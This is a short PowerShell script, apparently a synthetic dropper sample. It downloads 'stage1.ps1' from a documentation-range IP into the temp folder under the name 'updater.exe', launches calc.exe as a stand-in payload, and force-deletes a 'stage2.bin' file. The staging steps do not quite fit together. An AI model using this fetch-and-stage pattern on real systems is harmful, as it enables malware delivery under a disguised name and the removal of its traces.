[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://192.0.2.152:443/stage1.ps1',
    [string]$LocalPath = "$env:TEMP\updater.exe",
    [int]$TimeoutSec = 189
)
Invoke-WebRequest -Uri $FetchUrl -OutFile $LocalPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
